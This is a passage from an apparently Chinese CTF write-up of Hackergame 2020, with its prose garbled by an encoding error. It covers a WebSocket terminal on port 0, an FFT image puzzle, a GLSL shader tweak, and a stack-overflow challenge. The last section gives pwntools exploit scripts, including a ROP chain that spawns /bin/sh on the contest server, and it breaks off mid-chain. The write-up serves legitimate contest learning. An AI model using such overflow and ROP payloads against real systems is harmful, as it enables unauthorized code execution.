æ•ˆåœ°å€ã€‚</strong></p><p><a href="http://202.38.93.111:0/">http://202.38.93.111:0/</a></p></blockquote><p>è¿™ä¸ªçœŸçš„æœ‰æ„æ€ã€‚ä¸€èˆ¬ TCP ç«¯å£éƒ½æ˜¯1-65535ï¼Œäºæ˜¯å¾ˆå¤šå®¢æˆ·ç«¯éƒ½ä¸æ”¯æŒ 0 å·ç«¯å£ã€‚</p><p>å¥½åœ¨éƒ¨åˆ†ç‰ˆæœ¬çš„ curl ä»¥åŠ wget æ”¯æŒã€‚</p><p>ç„¶è€Œæˆ‘åœ¨æœ¬åœ°è·‘è¿˜è¿ä¸ä¸Šè¿™ä¸ªç«¯å£ï¼Œæ€•æ˜¯è¢«è¿è¥å•†ææ–­äº†ï¼Ÿ</p><p>åœ¨VPSä¸Šè¯•è¯•ï¼Œå‘ç°å¯è¡Œã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://202.38.93.111:0<span class="token comment"># æˆ–è€… </span><span class="token comment"># wget http://202.38.93.111:0</span></code></pre><p>å¾—åˆ°ä¸€ä¸ªç½‘é¡µï¼Œå‘ç°æ˜¯ä¸€ä¸ª xterm ç»ˆç«¯ï¼Œå’Œå…¶ä»–é¢˜ç›®çš„åœ¨çº¿ç»ˆç«¯ä¸€æ ·çš„ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Terminal<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/js/xterm/css/xterm.css<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/js/xterm/lib/xterm.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/js/xterm-addon-attach/lib/xterm-addon-attach.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/js/xterm-addon-fit/lib/xterm-addon-fit.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">      <span class="token selector">#terminal</span> <span class="token punctuation">{</span>        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>        <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>        <span class="token property">right</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>        <span class="token property">bottom</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>        <span class="token property">left</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>terminal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">const</span> term <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Terminal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">const</span> fitAddon <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FitAddon<span class="token punctuation">.</span>FitAddon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      term<span class="token punctuation">.</span><span class="token function">loadAddon</span><span class="token punctuation">(</span>fitAddon<span class="token punctuation">)</span><span class="token punctuation">;</span>      term<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"terminal"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      fitAddon<span class="token punctuation">.</span><span class="token function">fit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'resize'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        fitAddon<span class="token punctuation">.</span><span class="token function">fit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> firstmsg <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token keyword">const</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span>        location<span class="token punctuation">.</span>origin<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^http</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">"ws"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/shell"</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">const</span> attachAddon <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AttachAddon<span class="token punctuation">.</span>AttachAddon</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">;</span>      term<span class="token punctuation">.</span><span class="token function">loadAddon</span><span class="token punctuation">(</span>attachAddon<span class="token punctuation">)</span><span class="token punctuation">;</span>      socket<span class="token punctuation">.</span><span class="token function-variable function">onclose</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        term<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"\nConnection closed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      socket<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>firstmsg<span class="token punctuation">)</span> <span class="token punctuation">{</span>          firstmsg <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> token <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">replaceState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token punctuation">{</span>            localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            token <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">)</span> socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>token <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      term<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><p>è¿™ä¸ªé€»è¾‘æ˜¯è®¿é—®ç½‘é¡µåå®ä¾‹åŒ–ä¸€ä¸ª WebSocketï¼Œå°† HTTP å‡çº§åˆ° WS åè®®ï¼ŒURI ä¸º ws://202.38.93.111:0/shell</p><p>äºæ˜¯ä¹å°±å»æ‰¾ websocket å®¢æˆ·ç«¯æ¥å®ç°ã€‚</p><p>æœ€å¼€å§‹æƒ³ç”¨ pwntoolsï¼Œå‘ç°èƒ½ä½œä¸º socket è¿ä¸Šä½†è¿˜æ¨¡ä»¿ä¸äº† ws<em>ï¼ˆå¯èƒ½æ²¡é¢†æ‚Ÿåˆ°</em>ã€‚</p><p>ä¹‹åæ‰¾åˆ°äº† GitHub ä¸Šçš„ **<a href="https://github.com/websocket-client/websocket-client">websocket-client</a>**ï¼Œè¿™æ˜¯ä¸€ä¸ª Python çš„ ws åº“ï¼Œæœ¬æ¥æƒ³ç›´æ¥ç”¨ä»–ç°æˆçš„ <code>wsdump.py</code>ï¼Œå‘ç°è¿ä¸ä¸Šã€‚ã€‚</p><p>æœ€ååˆæ‰¾äº†ä¸ªç¼–è¯‘å¥½çš„å®¢æˆ·ç«¯ï¼Œ**<a href="https://github.com/vi/websocat">websocat</a>**ï¼ŒæŒ‰ç…§å®‰è£…è¯´æ˜è¿›è¡Œå®‰è£…ï¼Œå†è¿æ¥æœåŠ¡å™¨å°±å®Œäº‹äº†ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101162810752.png" alt="flag"></p><hr><h2 id="æ¥è‡ªä¸€æ•™çš„å›¾ç‰‡"><a href="#æ¥è‡ªä¸€æ•™çš„å›¾ç‰‡" class="headerlink" title="æ¥è‡ªä¸€æ•™çš„å›¾ç‰‡"></a>æ¥è‡ªä¸€æ•™çš„å›¾ç‰‡</h2><blockquote><p>å° P åœ¨ä¸€æ•™åš<strong>å‚…é‡Œå¶å…‰å­¦</strong>å®éªŒæ—¶ï¼Œåœ¨å®éªŒå®¤ç”µè„‘çš„æ¨¡æ‹Ÿç¨‹åºé‡Œå‘ç°äº†è¿™ä¹ˆä¸€å¼ çš„å›¾ç‰‡ï¼š</p><p><img src="/2020/11/08/CTF_2020Hackergame/4f_system_middle.bmp" alt="img"></p><p>æ•°ç†åŸºç¡€å¹¶ä¸æ‰å®çš„å° P å¹¶ä¸çŸ¥é“ä»€ä¹ˆä¸œè¥¿æˆåƒä¼šæ˜¯è¿™ä¸ªæ ·å­ï¼šåˆæˆ–è®¸ä»€ä¹ˆä¸œè¥¿éƒ½ä¸æ˜¯ï¼Œæ¯•ç«Ÿè¿™åªæ˜¯æ¨¡æ‹Ÿ â€¦ ä½†å¯ä»¥ç¡®å®šçš„æ˜¯ï¼Œè¿™äº›çœ‹ä¼¼å¥‡æ€ªçš„èŠ±çº¹é‡Œç¡®å®éšè—ç€ä¸€äº›ä¿¡æ¯ï¼Œæˆ–è®¸æ˜¯åœ°ä¸‹é‡‘çŸ¿çš„è—å®å›¾ä¹Ÿæœªå¯çŸ¥ã€‚</p></blockquote><p>æ ¹æ®æç¤ºåº”è¯¥ä¸ å‚…é‡Œå¶å˜æ¢ æœ‰å…³ã€‚</p><p>ç»™å›¾ç‰‡åšä¸ª FFT å¤„ç†ï¼Œå°±å¾—åˆ° flag äº†ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/fourier.png" alt="fourier"></p><p>æ‹¼ä¸€ä¸‹å°±èƒ½å¾—åˆ°</p><p><code>flag{Fxurier_xptics_is_fun}</code></p><p>å™¢ Fourier optics çš„ç¡®æ˜¯å‚…é‡Œå¶å…‰å­¦ï¼Œå˜»å˜»å˜»ã€‚</p><hr><h2 id="è¶…ç®€é™‹çš„-OpenGL-å°ç¨‹åº"><a href="#è¶…ç®€é™‹çš„-OpenGL-å°ç¨‹åº" class="headerlink" title="è¶…ç®€é™‹çš„ OpenGL å°ç¨‹åº"></a>è¶…ç®€é™‹çš„ OpenGL å°ç¨‹åº</h2><p>å•¥ä¹Ÿä¸æ‡‚ï¼Œé­”æ”¹å°±æ˜¯äº†ã€‚</p><p>æŠŠæ–‡ä»¶åˆ äº†ç‚¹ä¸œè¥¿ï¼Œä»–å‡ºæ¥è¿™æ ·çš„ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102203227613.png"></p><p>ä¸å¯¹åŠ²ï¼ŒæŸ¥äº†ä¸€ä¸‹è¿™ä¸ªå¥½åƒæ˜¯ OpenGLç€è‰²å™¨è¯­è¨€(GLSL)ã€‚</p><p>æœ‰æœºä¼šå¯ä»¥çœ‹çœ‹ <a href="https://learnopengl-cn.readthedocs.io/zh/latest/01%20Getting%20started/05%20Shaders/">OpenGL å…¥é—¨æ–‡æ¡£</a>ã€‚</p><p>æœ€åé­”æ”¹äº† <code>basic_lighting.vs</code> è¿™ä¸ªæ–‡ä»¶ã€‚çœ‹ä¸æ¸…æ¥šå°±æ”¹æ”¹åç§»å°±å¥½äº†ã€‚</p><pre class="language-none"><code class="language-none">void main(){    FragPos = vec3(projection * vec4(aPos-0.45, 1.0));    Normal = aNormal;          gl_Position = projection * view * vec4(FragPos, 1.0);}</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102230459235.png" alt="flag"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102230203413.png" alt="flag"></p><p><code>flag{glGraphicsHappy(233);}</code></p><hr><h2 id="ç”Ÿæ´»åœ¨åšå¼ˆæ ‘ä¸Š"><a href="#ç”Ÿæ´»åœ¨åšå¼ˆæ ‘ä¸Š" class="headerlink" title="ç”Ÿæ´»åœ¨åšå¼ˆæ ‘ä¸Š"></a>ç”Ÿæ´»åœ¨åšå¼ˆæ ‘ä¸Š</h2><h3 id="å§‹ç»ˆçƒ­çˆ±å¤§åœ°"><a href="#å§‹ç»ˆçƒ­çˆ±å¤§åœ°" class="headerlink" title="å§‹ç»ˆçƒ­çˆ±å¤§åœ°"></a>å§‹ç»ˆçƒ­çˆ±å¤§åœ°</h3><p>æ˜¯ä¸ªæœ€åŸºæœ¬çš„<strong>æ ˆæº¢å‡º</strong>ã€‚</p><p><code>gets(input);</code>å‡½æ•°å­˜åœ¨æ¼æ´ï¼Œçœ‹ä¸€ä¸‹æ ˆä¸Šæƒ…å†µã€‚</p><p><code>input</code> å¯¹åº” <code>v14</code>ï¼Œ<code>success</code> å¯¹åº” <code>v17</code></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103231134749.png"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103231221608.png" alt="stack"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103231201409.png" alt="stack"></p><p>åç§»ä¸º -0x01-(-0x90) = 0x8F</p><p>bool åº“é‡Œçš„ <code>true</code> ä¸º 0x01ã€‚</p><p>æŠŠè¿™ä¸ª <code>success</code> è¦†ç›–ä¸º 0x01 å°±èƒ½å‡º flag äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span><span class="token comment"># coding: utf-8</span><span class="token triple-quoted-string string">"""Hackergame_tictactoe@Author: MiaoTony@Time: 20201103"""</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>token <span class="token operator">=</span> <span class="token string">'xxxxxxxxxxxxxxxxxxx'</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"202.38.93.111"</span><span class="token punctuation">,</span> <span class="token number">10141</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input your token: '</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'1'</span> <span class="token operator">*</span> <span class="token number">0x8F</span>payload <span class="token operator">+=</span> <span class="token string">b'\x01'</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'such as (0,1): '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103230743129.png" alt="flag"></p><p><code>flag{easy_gamE_but_can_u_get_my_shel1}</code></p><h3 id="å‡ä¸Šå¤©ç©º"><a href="#å‡ä¸Šå¤©ç©º" class="headerlink" title="å‡ä¸Šå¤©ç©º"></a>å‡ä¸Šå¤©ç©º</h3><p>è¦æ‹¿ shell å•Šã€‚ã€‚</p><p>å…ˆç”¨ ROPgadget ç”Ÿæˆ ROP Chain.</p><pre class="language-bash" data-language="bash"><code class="language-bash">ROPgadget --binary tictactoe --ropchain</code></pre><p>ç„¶åæŠŠè¿™ä¸ªæ”¾åˆ°è¿”å›å€¼çš„ä½ç½®æ‰“è¿‡å»å°±å®Œäº‹äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span><span class="token comment"># coding: utf-8</span><span class="token keyword">from</span> struct <span class="token keyword">import</span> pack<span class="token keyword">from</span> pwn <span class="token keyword">import</span> context<span class="token punctuation">,</span> remotecontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>token <span class="token operator">=</span> <span class="token string">'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"202.38.93.111"</span><span class="token punctuation">,</span> <span class="token number">10141</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input your token: '</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'1'</span> <span class="token operator">*</span> <span class="token number">0x8F</span>payload <span class="token operator">+=</span> <span class="token string">b'\x01'</span>payload <span class="token operator">+=</span> <span class="token string">b'1'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token comment"># Padding goes here</span>p <span class="token operator">=</span> <span class="token string">b''</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000407228</span><span class="token punctuation">)</span>  <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e0</span><span class="token punctuation">)</span>  <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043e52c</span><span class="token punctuation">)</span>  <span class="token comment"># pop rax ; ret</span>p <span class="token operator">+=</span> <span class="token string">b'/bin//sh'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000046d7b1</span><span class="token punctuation">)</span>  <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000407228</span><span class="token punctuation">)</span>  <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e8</span><span class="token punctuation">)</span>  <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000439070</span><span class="token punctuation">)</span>  <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000046d7b1</span><span class="token punctuation">)</span>  <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004017b6</span><span class="token punctuation">)</span>  <span class="token comment"># pop rdi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e0</span><span class="token punctuation">)</span>  <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000407228</span><span class="token punctuation">)</span>  <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e8</span><span class="token punctuation">)</span>  <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043dbb5</span><span class="token punctuation">)</span>  <span class="token comment"># pop rdx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004a60e8</span><span class="token punctuation">)</span>  <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000439070</span><span class="token punctuation">)</span>  <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000463af0</span><span class="token punctuation">)</span>  